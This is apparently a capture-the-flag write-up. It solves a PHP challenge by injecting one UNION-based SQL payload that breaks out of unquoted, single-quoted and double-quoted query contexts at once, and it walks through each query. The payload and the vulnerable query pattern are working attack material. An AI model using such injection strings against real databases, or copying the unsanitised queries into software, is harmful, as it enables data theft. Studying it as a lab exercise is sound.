Let’s Dive In

By opening the provided index.php file, we can immediately spot a few interesting things right at the top:

error_reporting(0);
$con = mysqli_connect(DB_HOST_7, DB_USER_7, DB_PASS_7, DB_NAME_7);

We are clearly working with a database, highly suggesting a SQL Injection (SQLi) vulnerability. There is also no error reporting (error_reporting(0)), which is pretty suspicious. To understand what’s going on under the hood, let’s spin up a local testing container.

So here it gets interesting. It runs 3 queries without sanitization, cool.
But what’s up with the while loops?

Inside each loop, the script uses mysqli_fetch_array() to fetch the row, but notice how the result object variable ($first, $second, $third) is overwritten with the literal flag string: $first = $row["flag"];.

Finally, it checks if all three variables hold the exact same string value, and if so, prints the flag:

if (
     $first === $second &&
     $second === $third &&
     $first === "flag{g00d_j0b_k1dd0_u_SQL_m4ntr@_1z_p0w3rfu11}"
 ) {

The Solution:

Let’s refresh how the server makes the Queries, for payload=1

SELECT flag FROM flags WHERE id=1  
SELECT flag FROM flags WHERE id='1'  
SELECT flag FROM flags WHERE id="1"

Ok but what happens if we try to close those?

0 UNION SELECT flag FROM flags-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -

Substituting our payload into all three queries:

-- query 1 (raw)
SELECT flag FROM flags WHERE id=0 UNION SELECT flag FROM flags-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -

-- query 2 (single-quoted)
SELECT flag FROM flags WHERE id='0 UNION SELECT flag FROM flags-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -'

-- query 3 (double-quoted)
SELECT flag FROM flags WHERE id="0 UNION SELECT flag FROM flags-- -' UNION SELECT flag FROM flags-- -" UNION SELECT flag FROM flags-- -"

Let’s go through each one.

Q1 has no wrapping quotes, so the payload lands directly as SQL. -- - comments out the rest (the stray ' and " and everything after), leaving:

SELECT flag FROM flags WHERE id=0 UNION SELECT flag FROM flags

id=0 matches nothing, but the UNION appends every row from flags returning the flag.

Q2 wraps our payload in single quotes. Our embedded ' (right after -- -) closes the server’s opening quote early, breaking out of the string. MySQL then sees:

-- this part is just a string literal:  '0 UNION SELECT flag FROM flags-- -'
-- this part is SQL:               UNION SELECT flag FROM flags-- -"...

The string '0 UNION SELECT flag FROM flags-- -' coerces to integer 0, but the UNION after it runs freely and returns the flag. The trailing -- - comments out the leftover " and closing ' the server appended.

Q3 wraps our payload in double quotes. Same thing, our embedded " closes the server’s opening double-quote, and the final UNION SELECT flag FROM flags runs as live SQL. The trailing -- - eats the server’s leftover closing ".

All three queries return the flag row, $first === $second === $third === "flag{...}" passes, and the flag is printed.
